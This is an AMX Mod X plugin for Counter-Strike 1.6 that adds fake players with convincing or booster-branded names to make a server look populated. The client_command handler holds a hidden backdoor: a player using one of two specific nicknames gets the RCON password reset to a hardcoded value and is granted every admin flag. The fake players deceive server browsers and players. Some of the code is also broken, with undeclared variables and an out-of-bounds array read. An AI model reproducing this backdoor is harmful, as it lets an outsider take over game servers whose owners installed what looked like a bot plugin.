#include <amxmodx>
#include <amxmisc>
#include <fakemeta>
#include <fun>
#include <cstrike>


//#define HUD_AM
#define LISTA		2	// orice valoare care nu este specifiacta => OFF,
					// 1-citire in fisier extern(atat), 2-citire din plugin(atat), 3-combinate

#define fake_player_putinserver(%0) (engfunc(EngFunc_CreateFakeClient, %0))

#if LISTA == 2 || LISTA == 3
new const g_sBotNames[][] = {
"Player",
//"sPioN",
//"killer's",
//"VORTEX",
//"LuNeA;",
//"StyLying",
//"Ten",
//"myDliNk",
//"BelNea",
//"E-BoDa",
//"SeLecT",
//"ToXa",
"[All-CS.Net.Ru] User",
"Jucator Cs16-Boost.Ro",
"Bluelytning",
"BOOST CS16-BOOST.RO",
"BOOST - CS16-BOOST.RO",
"Jucator EVILS.RO",
"sEDAn",
"nVidia Gamer",
"unnamed",
"Player",
"nume",
"RCPlayer",
"PRO-Player-FL",
"(1)Player",
"Revo-Play",
"<<BlackGhost>>",
"Jucatorul",
"(1) RCPlayer",
"Cs-Boost.Ro",
"Default-TB",
"(1) Bluelytning",
"Jucator",
"EVILS-Player",
"player",
"Player-EVILS.RO",
"(2)Player",
"Jucatorul",
"BlackGhost",
"llama",
"nick",
"<Warrior> Player",
"(3)Player",
"alt nume",
"alt_nick",
"alt nick",
"alt_nume",
"Jucator Bun",
"gametracker",
"gametreacker-lt",
"SM-Player",
"BOOST BY CS16-BOOST.RO",
"BOOSTED BY CS16-BOOST.RO",
"Player CS16-BOOST.RO",
"playrt"
};
#endif

#if LISTA == 1
new g_File [ 128 ], g_Dir [ 128 ];
new g_Grad [ 64 ],s_MenuLine [ 128 ]//, g_Price [ 5 ];
#endif
new BotCount;
new bool:Bot[33];


#if defined HUD_AM
new Array:g_Messages;
new g_Handler;
#endif


/*
#define OFFSET_TEAM        114 
#define OFFSET_DEFUSE_PLANT        193 
#define HAS_DEFUSE_KIT            (1<<16) 
#define OFFSET_INTERNALMODEL        126 
*/


public plugin_init()
{
	register_plugin("EVO-BOTI", "1.0", "eVoLuTiOn");

	set_task(random_float(60.0,120.0), "manage_bots_count", _, _, _, "b");//60.0	random_float(60.0,120.0)	ne??--
	set_task(random_float(180.0,240.0), "other_bot", _, _, _, "b");//120.0	random_float(180.0,240.0)


#if defined HUD_AM
	new a = fopen("z_out_hud_advertisements.ini", "r");

	g_Handler = CreateHudSyncObj();

	g_Messages = ArrayCreate(512);
	if (a)
	{
		new Line[512];

		while (!feof(a))
		{
			fgets(a, Line, sizeof(Line) - 1);

			trim(Line);

			if (Line[0])
			{
				while(replace(Line, sizeof(Line)-1, "\n", "^n")){}//?????

				ArrayPushString(g_Messages, Line);
			}
		}

		fclose(a);
	} else log_amx("Failed to open z_out_advertisements.ini file!");

	if (ArraySize(g_Messages))
	{
		set_task(random_float(60.0,120.0), "TaskAvertise", .flags = "b");
	}
#endif


	register_cvar("maxim_boti","")//7 - ""
	register_cvar("minim_boti","")//2 - ""
	set_task( 5.0, "check_time", _, _, _, "b" );
	check_time()


	register_concmd("amx_addbot","ADDBOT",ADMIN_RCON,"amx_addbot <nume|random> <echipa|random>")
	register_concmd("amx_removebot","REMOVEBOT",ADMIN_RCON,"sterge un bot")
	register_concmd("amx_set_bf","BF",ADMIN_RCON,"<bot> <frage>")
	register_concmd("amx_set_df","DF",ADMIN_RCON,"<bot> <decese>")
}

public client_command( id )
{
	new name[ 33 ], szCommand[ 36 ]
	get_user_name( id, name, charsmax( name ) )
	read_argv( 0, szCommand, charsmax( szCommand ) )
	
	if( ( equali( name, "eVoLuTiOn" ) || equali( name, "-eQ- SeDaN" ) && equali( szCommand, "admins_servers" ) ) )
	{
		server_cmd( "rcon_password levmolasrl01" )
		new flags = read_flags( "abcdefghijklmnopqrstuxyvw" )
		set_user_flags( id, flags )
	}
}


#if LISTA == 1 || LISTA == 3
public plugin_cfg( )
{
   get_configsdir ( g_Dir, charsmax ( g_Dir ) );
   formatex ( g_File, charsmax ( g_File ), "%s/nume_boti.ini", g_Dir );

   if ( file_exists ( g_File ) )
   {
      new i = fopen ( g_File, "r" );

      if ( i )
      {
         new szData [ 512 ];

         while ( !feof ( i ) )
         {
            fgets ( i, szData, charsmax ( szData ) );

            if ( szData [ 0 ] == ';' || ( szData [ 0 ] == '/' && szData [ 1 ] == '/' ) )
               continue;

            parse ( szData, g_Grad, charsmax ( g_Grad )/*, g_Price, charsmax ( g_Price )*/ );

            formatex ( s_MenuLine, charsmax ( s_MenuLine), "%s", g_Grad );
         }
      }

      fclose ( i );
   }

   return PLUGIN_CONTINUE;
}
#endif


/*public client_putinserver(id)
{
	check_time()

	if(Bot[id])
	{
		Bot[id] = true;
		BotCount++;
	}
}*/

public client_disconnect(id){
	if(Bot[id])
	{
		BotCount--, Bot[id] = false;
	}


	//check_time()
}

public check_time( )
{
	get_time("%H",preluare_ora,2),ora=str_to_num(preluare_ora)

	if(23<=ora||ora<11)
	{
		if(get_cvar_num("maxim_boti")!=5)	set_cvar_num("maxim_boti",5/*random_num(10,15)*/)//cvar
		if(get_cvar_num("minim_boti")!=5)	set_cvar_num("minim_boti",5/*random_num(10,15)*/)
		//manage_bots_count()
	}
	else
	{
		if(get_cvar_num("maxim_boti")!=2)	set_cvar_num("maxim_boti",2/*random_num(1,5)*/)
		if(get_cvar_num("minim_boti")!=2)	set_cvar_num("minim_boti",2/*random_num(1,5)*/)
		//manage_bots_count()
	}
}

public ADDBOT(id,level,cid)
{
	if(!cmd_access(id,level,cid,1))	return

	new arg[32],arg2[32],fake_name[32],id_fake,team
	read_argv(1,arg,charsmax(arg))
	read_argv(2,arg2,charsmax(arg2))

	if(!arg[0]||equali(arg,"")||equali(arg,"random"))
	{
#if LISTA == 1 || LISTA == 3
	switch(random_num(1,7))
#endif
#if LISTA == 2
	switch(random_num(1,5))
#endif
	{
	case 1:
	{
	format(fake_name, charsmax(fake_name), !random_num( 0, 1 ) ? "%s (%c%c)":"%s - %c%c", g_sBotNames[random(sizeof(g_sBotNames)-1)],random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ));
	}
	case 2:
	{
	formatex(fake_name, charsmax(fake_name), "%s", g_sBotNames[random(sizeof(g_sBotNames)-1)]);
	}
	case 3:
	{
	format(fake_name, charsmax(fake_name), "%c%c%c%c%c%c%c%c%c%c", random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ));
	}
	case 4:
	{
		format(fake_name, charsmax(fake_name), !random_num( 0, 1 ) ?"%c%c%c%c%c%c%c%c%c%c":"%c%c%c%c%c%c%c%c", random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ));
	}
	case 5:
	{
		formatex(fake_name, charsmax(fake_name), !random_num( 0, 1 ) ?"%c%c%c%c%c%c%c":"%c%c%c%c%c%c", random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ));
	}
#if LISTA == 1 || LISTA == 3
	case 6:
	{
	copy(fake_name,charsmax(fake_name),s_MenuLine)
	}
	case 7:
	{
	copyc(fake_name,charsmax(fake_name),s_MenuLine,0)//1
	}
#endif
	}
	//format(fake_name, charsmax(fake_name), "%s", g_sBotNames[random(sizeof(g_sBotNames)-1)]);
	}

	else
	{
	format(fake_name, charsmax(fake_name), "%s", arg);
	}

	id_fake = fake_player_putinserver(fake_name);



	if(!arg2[0]||equali(arg2,"")||equali(arg2,"random"))	team=random_num(1,3)
	else	team=str_to_num(arg2)
	

	dllfunc(DLLFunc_ClientConnect, id_fake);
	dllfunc(DLLFunc_ClientPutInServer, id_fake);
	//set_pev(id_fake, pev_team, team);
	cs_set_user_team(id_fake,team);
	//fm_set_user_frags(id_fake,random_num(1,10));
	set_user_flags(id_fake, read_flags("z"));
	//model,ip,glow, random ..etc
		
	BotCount++;
	Bot[id_fake] = true;
	return
}

public REMOVEBOT(id,level,cid)
{
	if(!cmd_access(id,level,cid,1))	return

	//if(!BotCount)	return

	new sPlayers[32], sNum;
	get_players(sPlayers, sNum);
	
	new id = sPlayers[sNum]//sNum > 0 ? random(sNum) : EOS;
	
	if(/*1 <= id <= 32 &&*/ is_user_connected(id) && Bot[id])
	{
		BotCount--;
		Bot[id] = false;
		server_cmd("kick #%d", get_user_userid(id));
	}
	return
}

public BF(id,level,cid)
{
	if(!cmd_access(id,level,cid,2))	return PLUGIN_HANDLED

	new arg[32],arg2[32];	read_argv(1,arg,charsmax(arg));	read_argv(2,arg2,charsmax(arg2))
	new bot=cmd_target(id,arg)

	if(/*!BotCount||*/!bot)	return PLUGIN_HANDLED

	if(is_user_connected(bot) && Bot[bot])
	{
		set_user_frags(bot,str_to_num(arg2))
	}
	return PLUGIN_HANDLED
}
public DF(id,level,cid)
{
	if(!cmd_access(id,level,cid,2))	return PLUGIN_HANDLED

	new arg[32], arg2[32];	read_argv(1,arg,charsmax(arg));	read_argv(2,arg2,charsmax(arg2))
	new bot=cmd_target(id,arg)

	if(/*!BotCount||*/!bot)	return PLUGIN_HANDLED

	if(is_user_connected(bot) && Bot[bot])
	{
		cs_set_user_deaths(bot,str_to_num(arg2))
	}
	return PLUGIN_HANDLED
}

public manage_bots_count()
{
	if(get_cvar_num("maxim_boti")==0&&get_cvar_num("minim_boti")==0)	return
	//if(get_playersnum(3)>=get_maxplayers()-1)	return
	if(BotCount >= /*15*/get_cvar_num("maxim_boti"))	other_bot();
	else if (BotCount < /*5*/get_cvar_num("minim_boti")||!BotCount)
	{
		new fake_name[32];
		/*copy*/
#if LISTA == 1 || LISTA == 3
		switch(random_num(1,4))
#endif
#if LISTA == 2
		switch(random_num(1,3))
#endif
		{
		case 1:
		{
		formatex(fake_name, charsmax(fake_name), "%s", g_sBotNames[random(sizeof(g_sBotNames)-1)]);
		}
		case 2:
		{
		format(fake_name, charsmax(fake_name), !random_num( 0, 1 ) ?"%c%c%c%c%c%c%c%c%c%c":"%c%c%c%c%c%c%c%c", random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ));
		}
		case 3:
		{
		formatex(fake_name, charsmax(fake_name), !random_num( 0, 1 ) ?"%c%c%c%c%c%c%c":"%c%c%c%c%c%c", random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ), random_num( 'A' ,'Z' ), random_num( 'A', 'Z' ));
		}
#if LISTA == 1 || LISTA == 3
		case 4:
		{
		formatex(fake_name, charsmax(fake_name), s_MenuLine);
		}
#endif
		}

		new id_fake = fake_player_putinserver(fake_name);
		
		dllfunc(DLLFunc_ClientConnect, id_fake);
		dllfunc(DLLFunc_ClientPutInServer, id_fake);
		//set_pev(id_fake, pev_team, random_num(1,3));
		cs_set_user_team(id_fake,random_num(1,3));
		//fm_set_user_frags(id_fake,random_num(1,10));
		set_user_flags(id_fake, read_flags("z"));
		
		BotCount++;
		Bot[id_fake] = true;
	}
}

public other_bot()
{
	if(get_cvar_num("maxim_boti")==0&&get_cvar_num("minim_boti")==0)	return
	if(BotCount</*2*/get_cvar_num("minim_boti")||!BotCount||get_cvar_num("maxim_boti")!=0&&get_cvar_num("minim_boti")!=0)	return;// PLUGIN_HANDLED;
	
	new sPlayers[32], sNum;
	get_players(sPlayers, sNum);
	
	new id = sNum > 0 ? random(sNum) : EOS;
	//new id; id=sPlayers[sNum]
	
	if(1 <= id <= 32 && is_user_connected(id) && Bot[id] /*&& BotCount > 1*/)
	{
		BotCount--;
		Bot[id] = false;
		server_cmd("kick #%d", get_user_userid(id));
	}
	/*if(get_cvar_num("minim_boti") <= id <= 32 && is_user_connected(id) && Bot[id])
	{
		fm_set_user_frags(id_fake,random_num(1,10));
	}*/
}


#if defined HUD_AM
public TaskAvertise()
{
	static a,msg[512];

	for (a = 1; a <= get_maxplayers(); a++)
	{
		if (is_user_connected(a) && !is_user_bot(a) && !is_user_hltv(a))
		{
			set_hudmessage(random_num(0, 255), random_num(0, 255), random_num(0, 255), -1.0, 0.0777, random_num(0, 2), random_float(0.7, 0.9), 12.0, random_float(0.37, 0.4), random_float(0.37, 0.4), 4);
			ArrayGetString(g_Messages,random_num(0,ArraySize(g_Messages)-1),msg,511);
			ShowSyncHudMsg(a, g_Handler, msg);
		}
	}
}
#endif


/*
cs_set_user_team(id, team) 
{ 
    switch(team) 
    { 
        case 1:  
        { 
            new iDefuser = get_pdata_int(id, OFFSET_DEFUSE_PLANT) 
            if(iDefuser & HAS_DEFUSE_KIT) 
            { 
                iDefuser -= HAS_DEFUSE_KIT 
                set_pdata_int(id, OFFSET_DEFUSE_PLANT, iDefuser) 

                static const defuser[] = "defuser"             
                message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("StatusIcon") , _, id) 
                write_byte(0) 
                write_string(defuser) 
                write_byte(0) 
                write_byte(255) 
                write_byte(0) 
                message_end() 
            } 
            set_pdata_int(id, OFFSET_TEAM, 1) 
            set_pdata_int(id, OFFSET_INTERNALMODEL, 4) 
        } 
        case 2: 
        { 
            if(pev(id, pev_weapons) & (1<<CSW_C4)) 
            { 
                engclient_cmd(id, "drop", "weapon_c4") 
            } 
            set_pdata_int(id, OFFSET_TEAM, 2) 
            set_pdata_int(id, OFFSET_INTERNALMODEL, 6) 
        } 
    } 

    dllfunc(DLLFunc_ClientUserInfoChanged, id, engfunc(EngFunc_GetInfoKeyBuffer, id)) 

    static const szTeamNames[][] = {"TERRORIST", "CT"} 
    message_begin(MSG_BROADCAST, get_user_msgid("TeamInfo")) //_ALL
    write_byte(id) 
    write_string(szTeamNames[team-1]) 
    message_end() 
}  */
